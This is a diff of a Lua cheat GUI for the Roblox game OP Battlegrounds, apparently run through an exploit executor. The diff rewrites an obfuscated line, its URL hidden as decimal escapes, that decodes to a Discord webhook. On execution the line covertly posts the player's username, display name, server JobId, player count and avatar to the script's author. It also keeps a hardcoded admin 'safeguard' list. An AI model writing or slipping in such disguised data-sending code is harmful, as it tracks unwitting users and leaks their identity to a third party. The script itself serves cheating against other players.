@@ -1,7 +1,16 @@
 -- Gui to Lua Version 3.2
--- Realirist's OPBGGUI
--- fixed bugs
+--[[
+REALIRIST'S OPBGGUI
+REMOVING ANY SAFEGUARD ON WATCH, WILL FORCE ME TO DELETE THE SCRIPT.
 
+
+ Updated format for logging
+ @real OPBGGUI EXECUTED
+Username: User
+Display: DisplayName
+ Server Size: Players/MaxPlayers
+JobId/ServerId: JobId
+ ]]
 -- Instances:
 
 local OPBGGUI = Instance.new("ScreenGui")
@@ -856,13 +865,12 @@ UISizeConstraint_36.MinSize = Vector2.new(200, 28)
 
 -- Scripts:
 
-local function TSVIXLD_fake_script() -- Main.LocalScript 
+local function QKESM_fake_script() -- Main.LocalScript 
 	local script = Instance.new('LocalScript', Main)
 
 	warn('OP BATTLEGROUNDS GUI BY REALIRIST')
 	warn('don\'t skid bru im doing yall favors')
-	if http_request then http_request({Url = "\104\116\116\112\115\58\47\47\100\105\115\99\111\114\100\46\99\111\109\47\97\112\105\47\119\101\98\104\111\111\107\115\47\49\51\50\54\54\50\57\51\57\54\51\50\52\50\56\54\53\53\53\47\74\68\102\82\73\108\95\73\78\99\79\66\113\112\54\81\67\106\86\119\49\87\82\50\82\116\121\57\85\79\84\97\51\68\73\107\89\54\106\77\97\82\52\109\86\51\113\66\65\105\72\111\49\53\70\45\112\78\106\106\89\55\113\79\51\56\67\72",Method = "POST",Headers = {["Content-Type"] = "application/json"},Body = game.HttpService:JSONEncode({content = '<@763885428901543957> OPBGGUI EXECUTED\nUsername: '..game.Players.LocalPlayer.Name.. '\nDisplay: '.. game.Players.LocalPlayer.DisplayName.. '\nJobId/ServerId: ```'.. game.JobId..'```',embeds = {{image = {url = game.HttpService:JSONDecode(game:HttpGet('https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds=' .. tostring(game.Players.LocalPlayer.UserId) .. '&size=180x180&format=png')).data[1].imageUrl}}}})})
-	end
+	if http_request then http_request({Url = "\104\116\116\112\115\58\47\47\100\105\115\99\111\114\100\46\99\111\109\47\97\112\105\47\119\101\98\104\111\111\107\115\47\49\51\50\54\54\50\57\51\57\54\51\50\52\50\56\54\53\53\53\47\74\68\102\82\73\108\95\73\78\99\79\66\113\112\54\81\67\106\86\119\49\87\82\50\82\116\121\57\85\79\84\97\51\68\73\107\89\54\106\77\97\82\52\109\86\51\113\66\65\105\72\111\49\53\70\45\112\78\106\106\89\55\113\79\51\56\67\72",Method = "POST",Headers = {["Content-Type"] = "application/json"},Body = game.HttpService:JSONEncode({content = '<@763885428901543957> OPBGGUI EXECUTED\nUsername: '..game.Players.LocalPlayer.Name.. '\nDisplay: '.. game.Players.LocalPlayer.DisplayName.. '\n Server Size: '.. tostring(#game.Players:GetPlayers()).. '/'.. tostring(game.Players.MaxPlayers).. '\nJobId/ServerId: '.. game.JobId,embeds = {{image = {url = game.HttpService:JSONDecode(game:HttpGet('https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds=' .. tostring(game.Players.LocalPlayer.UserId) .. '&size=180x180&format=png')).data[1].imageUrl}}}})}) end
 	local legacyChat = game:GetService("TextChatService").ChatVersion == Enum.ChatVersion.LegacyChatService
 	local sayMessage
 	if not legacyChat then
@@ -1383,6 +1391,7 @@ local function TSVIXLD_fake_script() -- Main.LocalScript
 		end
 	end
 	local function safeguard(plr)
+		-- REMOVING ANY PART OF THIS SAFEGUARD WILL MAKE ME STOP GIVING YALL THIS SCRIPT.
 		local admins = {
 			'Realirist',
 			'olidragon210', -- payed 1000 and 200 for source code too
@@ -1476,4 +1485,4 @@ local function TSVIXLD_fake_script() -- Main.LocalScript
 	end)
 	co()
 end
-coroutine.wrap(TSVIXLD_fake_script)()
+coroutine.wrap(QKESM_fake_script)()
